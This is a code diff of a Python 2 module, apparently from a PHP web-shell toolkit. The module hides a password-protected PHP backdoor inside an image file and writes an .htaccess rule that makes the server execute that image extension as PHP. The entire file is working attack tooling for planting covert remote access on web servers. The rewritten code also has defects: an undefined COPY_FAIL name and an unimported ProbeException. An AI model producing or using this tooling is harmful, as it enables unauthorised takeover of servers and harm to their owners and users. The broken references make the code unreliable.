@@ -1,89 +1,97 @@
+'''
+Created on 22/ago/2011
 
-from core.parameters import ParametersList, Parameter as P
-from core.module import Module, ModuleException
-from core.backdoor import Backdoor
-from os import path, mkdir, unlink
-from commands import getoutput
-
-
-classname = 'Img'
-
-class Img(Module):
-
-    htaccess_template = '''AddType application/x-httpd-php .%s
+@author: norby
 '''
 
+from core.moduleprobe import ModuleProbe
+from core.moduleexception import ModuleException
+from core.backdoor import Backdoor
+from os import path, mkdir
+from shutil import copy
+from tempfile import mkstemp
+from commands import getstatusoutput
 
-    params = ParametersList('Backdoor existing image and create htaccess (needs remote AllowOverride)', [],
-                        P(arg='lpath', help='Input image path', required=True, pos=0),
-                        P(arg='outdir', help='Folder to save modified image and .htaccess', default='generated-img', pos=1))
+htaccess_template = '''AddType application/x-httpd-php .%s
+'''
 
+WARN_IMG_NOT_FOUND = 'Input image not found'
+WARN_DIR_CREAT = 'Making folder'
+WARN_WRITING_DATA = 'Writing data'
+WARN_COPY_FAIL = 'Copy fail'
+WARN_PHP = 'Can\'t execute PHP interpreter'
+WARN_PHP_TEST = 'Error executing php code appended at image. Retry with simpler image or blank gif'
 
+class Img(ModuleProbe):
+    """Backdoor existing image and create related .htaccess"""
 
-    def __init__( self, modhandler , url, password):
-        """ Avoid to load default interpreter """
-        self.backdoor = Backdoor(password)
-        self.modhandler = modhandler
-        self.modhandler.interpreter = True
+    def _set_args(self):
+        self.argparser.add_argument('pass', help='Password')
+        self.argparser.add_argument('img', help='Input image path')
+        self.argparser.add_argument('ldir', help='Dir where to save modified image and .htaccess', default= 'bd_output', nargs='?')
 
-        self.password = password
-        self.name = self.__module__
-
-
-    def run_module( self, input_img, output_dir ):
-
-        if not path.exists(input_img):
-            raise ModuleException(self.name, "Image '%s' not found" % input_img)
-
-        if not '.' in input_img:
-            raise ModuleException(self.name, "Can't find '%s' extension" % input_img)
-
-        input_img_ext = input_img.split('.').pop()
-
-        if not path.exists(input_img):
-            raise ModuleException(self.name, "Image '%s' not found" % input_img)
-
-        if not path.exists(output_dir):
-            mkdir(output_dir)
-
-        output_img_name = input_img.split('/').pop()
-        output_img = '%s/%s' % (output_dir, output_img_name)
-        output_img_test = '%s/test_%s' % (output_dir, output_img_name)
-        output_htaccess = '%s/.htaccess' % output_dir
-
+    def __append_bin_data(self, pathfrom, pathto, data):
+        
         try:
-            input_img_data = file( input_img, 'r' ).read()
+            copy(pathfrom, pathto)
         except Exception, e:
-            raise ModuleException(self.name, str(e))
-
+            raise ModuleException(self.name, "%s %s" % (COPY_FAIL, str(e)))
+        
         try:
-            out = file( output_img_test, 'w' )
-            out.write( '%s<?php print(str_replace("#","","T#E#S#T# #O#K#"));  ?>' % input_img_data)
-            out.close()
+            open(pathto, "ab").write(data)
         except Exception, e:
-            raise ModuleException(self.name, str(e))
+            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
+            
 
-        test_output = getoutput('php %s' % output_img_test)
-        unlink(output_img_test)
+    def __php_test_version(self):
+        status, output = getstatusoutput('php -v')
+        if status == 0 and output: return True
+        return False
 
-        if 'TEST OK' in test_output:
+    def __php_test_backdoor(self, path):
+        status, output = getstatusoutput('php %s' % path)
+        if status == 0 and 'TEST OK' in output: return True
+        return False
 
+    def _prepare_probe(self):
+        
+        if not path.isfile(self.args['img']):
+            raise ModuleException(self.name, "'%s' %s" % (self.args['img'], WARN_IMG_NOT_FOUND))
+        
+        if not path.isdir(self.args['ldir']):
             try:
-                out = file( output_img, 'w' )
-                out.write( '%s%s' % (input_img_data, str(self.backdoor).replace('\n',' ')))
-                out.close()
+                mkdir(self.args['ldir'])
             except Exception, e:
-                raise ModuleException(self.name, str(e))
+                raise ModuleException(self.name, "%s %s" % (WARN_DIR_CREAT, str(e)))
+        
+        temp_file, temp_path = mkstemp()
+        
+        if not self.__php_test_version():
+            raise ProbeException(self.name, WARN_PHP)
+        self.__append_bin_data(self.args['img'], temp_path, '<?php print(str_replace("#","","T#E#S#T# #O#K#")); ?>')
+        if not self.__php_test_backdoor(temp_path):
+            raise ProbeException(self.name, '\'%s\' %s' % (self.args['img'], WARN_PHP_TEST))
 
-        else:
 
-            raise ModuleException(self.name, '[%s] Error testing backdoor in image \'%s\'. Choose simpler image as an empty gif file' % (self.name, output_img_test))
+    def _probe(self):
+        
+        filepath, filename = path.split(self.args['img'])
+        fileext = filename.split('.')[-1]
+        
+        path_img2 = path.join(self.args['ldir'], filename)
+        
+        oneline_backdoor = Backdoor(self.args['pass']).backdoor.replace('\n',' ')
+        self.__append_bin_data(self.args['img'], path_img2, oneline_backdoor)
 
+        path_htaccess = path.join(self.args['ldir'], '.htaccess')        
         try:
-            hout = file( output_htaccess, 'wt' )
-            hout.write( self.htaccess_template % input_img_ext )
-            hout.close()
+            open(path_htaccess, "w+").write(htaccess_template % fileext)
         except Exception, e:
-            raise ModuleException(self.name, str(e))
-
-        self.mprint("[%s] Backdoor file '%s' and '%s' created with password '%s'." % ( self.name, output_img, output_htaccess, self.password ))
+            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
+                    
+        self.mprint("Backdoor files '%s' and '%s' created with password '%s'" % (path_img2, path_htaccess, self.args['pass']))
+                    
+        self._result =  [ path_img2, path_htaccess ]
+        
+    def _output_result(self):
+        pass      
